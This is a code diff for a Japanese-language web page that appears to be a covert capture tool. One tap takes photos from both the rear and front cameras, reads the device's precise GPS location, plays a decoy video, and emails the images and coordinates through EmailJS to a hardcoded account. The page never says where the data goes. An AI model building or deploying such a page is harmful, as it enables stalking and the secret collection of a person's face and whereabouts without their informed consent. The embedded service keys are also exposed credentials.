@@ -1,145 +1,152 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8">
-  <title>📷 タッチキャプチャ＆送信</title>
-  <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
+  <meta charset="UTF-8" />
+  <title>カメラ・位置・送信アプリ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://cdn.emailjs.com/sdk/3.11.0/email.min.js"></script>
   <style>
     body {
       font-family: sans-serif;
-      padding: 20px;
-      background: linear-gradient(135deg, #667eea, #764ba2);
+      background: #222;
       color: white;
-      text-align: center;
+      padding: 20px;
     }
-    img, video {
-      max-width: 100%;
-      border-radius: 8px;
-      margin: 10px 0;
+    .touch-area {
+      background: #444;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      cursor: pointer;
     }
     .status {
+      margin-top: 15px;
       padding: 10px;
       border-radius: 5px;
-      margin: 10px 0;
-      background: rgba(0,0,0,0.3);
+      background: #333;
     }
-    .error { background: rgba(255,0,0,0.3); }
-    .success { background: rgba(0,255,0,0.2); }
-    .warning { background: rgba(255,255,0,0.2); }
+    img {
+      max-width: 100%;
+      border-radius: 8px;
+    }
   </style>
 </head>
 <body>
-  <h1>📷 タッチで撮影＆送信</h1>
-  <p>クリックまたはタッチで処理開始</p>
-  <div class="status" id="status">待機中...</div>
-
-  <video id="video" autoplay muted playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <img id="rear" style="display:none;">
-  <img id="front" style="display:none;">
-  <video id="playback" controls style="display:none;"></video>
+  <div class="touch-area" id="touchArea">📸 タップで処理開始</div>
+  <div class="status" id="status">待機中</div>
+  <img id="capturedRear" style="display:none" />
+  <img id="capturedFront" style="display:none" />
+  <video id="playbackVideo" controls style="display:none"></video>
 
   <script>
     emailjs.init("cPjKBUm_i6HebDQF7");
 
     const statusEl = document.getElementById("status");
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const imgRear = document.getElementById("rear");
-    const imgFront = document.getElementById("front");
-    const playback = document.getElementById("playback");
+    const touchArea = document.getElementById("touchArea");
+    const capturedRear = document.getElementById("capturedRear");
+    const capturedFront = document.getElementById("capturedFront");
+    const playbackVideo = document.getElementById("playbackVideo");
 
-    const sampleVideo = "data:video/mp4;base64,AAAAIGZ0eXB...（略）"; // 適切なBase64動画データに差し替え
+    const sampleVideoBase64 = "data:video/mp4;base64,AAAAIGZ0eXBpc...（略）";
 
-    function updateStatus(msg, cls = "") {
-      statusEl.textContent = msg;
-      statusEl.className = `status ${cls}`;
+    function updateStatus(text) {
+      statusEl.textContent = text;
+      console.log("[Status]", text);
     }
 
-    async function capturePhoto(facing) {
-      updateStatus(`📸 ${facing}カメ起動中...`, "warning");
+    async function capturePhoto(facingMode) {
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: facing }, audio: false
+        video: { facingMode }, audio: false
       });
+      const video = document.createElement("video");
       video.srcObject = stream;
-      await new Promise(r => setTimeout(r, 1500));
+      await video.play();
+      await new Promise(r => setTimeout(r, 1000));
+      const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       canvas.getContext("2d").drawImage(video, 0, 0);
-      const base64 = canvas.toDataURL("image/jpeg", 0.6);
+      const base64 = canvas.toDataURL("image/jpeg", 0.7);
       stream.getTracks().forEach(t => t.stop());
       return base64;
     }
 
-    function getLocation() {
-      updateStatus("📍 位置情報取得中...", "warning");
+    async function getLocation() {
       return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject(new Error("Geolocation not supported"));
+        }
         navigator.geolocation.getCurrentPosition(pos => {
           resolve({
-            lat: pos.coords.latitude,
-            lng: pos.coords.longitude,
-            acc: pos.coords.accuracy,
-            time: new Date().toISOString()
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            timestamp: new Date().toISOString()
           });
-        }, err => {
-          reject(new Error("位置情報エラー: " + err.message));
-        }, { enableHighAccuracy: true, timeout: 10000 });
+        }, reject);
       });
     }
 
-    async function sendEmail({rear, front, location, videoStatus}) {
-      updateStatus("📨 メール送信中...", "warning");
+    async function playVideo() {
+      try {
+        playbackVideo.src = sampleVideoBase64;
+        playbackVideo.style.display = "block";
+        await playbackVideo.play();
+        updateStatus("🎬 動画再生成功");
+        return true;
+      } catch (e) {
+        updateStatus("⚠️ 動画再生失敗（続行）");
+        return false;
+      }
+    }
+
+    async function sendEmail({ photoRear, photoFront, location, videoPlayed }) {
+      updateStatus("✉️ メール送信中...");
       try {
         await emailjs.send("service_ja2c09x", "template_2fp2jrg", {
-          photo_rear: rear,
-          photo_front: front,
-          location_info: `緯度: ${location.lat}<br>経度: ${location.lng}<br>精度: ${location.acc}m<br>時刻: ${location.time}`,
-          video_status: videoStatus,
+          photo_rear: photoRear,
+          photo_front: photoFront,
+          location_info: `緯度: ${location.latitude}<br>経度: ${location.longitude}<br>精度: ${location.accuracy}m<br>時刻: ${location.timestamp}`,
+          video_status: videoPlayed ? "動画再生完了" : "動画再生無し",
           date: new Date().toLocaleString()
         });
-        updateStatus("✅ メール送信成功", "success");
+        updateStatus("✅ メール送信成功");
       } catch (e) {
-        console.error("EmailJS送信エラー:", e);
-        updateStatus("❌ メール送信失敗", "error");
+        updateStatus("❌ メール送信失敗");
+        console.error("EmailJS Error:", e);
       }
     }
 
-    async function execute() {
+    async function handleTouch() {
       try {
-        updateStatus("🔄 処理中...", "warning");
+        updateStatus("📸 外カメ撮影中...");
         const rear = await capturePhoto("environment");
-        imgRear.src = rear;
-        imgRear.style.display = "block";
+        capturedRear.src = rear;
+        capturedRear.style.display = "block";
 
+        updateStatus("📸 内カメ撮影中...");
         const front = await capturePhoto("user");
-        imgFront.src = front;
-        imgFront.style.display = "block";
+        capturedFront.src = front;
+        capturedFront.style.display = "block";
 
-        const location = await getLocation();
+        updateStatus("📍 位置情報取得中...");
+        const loc = await getLocation();
 
-        let videoStatus = "動画再生無し";
-        try {
-          playback.src = sampleVideo;
-          await playback.play();
-          playback.style.display = "block";
-          videoStatus = "動画再生完了";
-        } catch (e) {
-          console.warn("動画再生失敗:", e);
-        }
+        const videoPlayed = await playVideo();
 
-        await sendEmail({ rear, front, location, videoStatus });
-        updateStatus("🎉 全処理完了", "success");
-      } catch (e) {
-        console.error("エラー:", e);
-        updateStatus("❌ エラー: " + e.message, "error");
+        await sendEmail({
+          photoRear: rear,
+          photoFront: front,
+          location: loc,
+          videoPlayed
+        });
+      } catch (err) {
+        updateStatus("❌ エラー: " + err.message);
+        console.error(err);
       }
     }
 
-    document.body.addEventListener("click", () => execute());
-    document.body.addEventListener("touchstart", e => {
-      e.preventDefault();
-      execute();
-    }, { passive: false });
+    touchArea.addEventListener("click", handleTouch);
   </script>
 </body>
 </html>
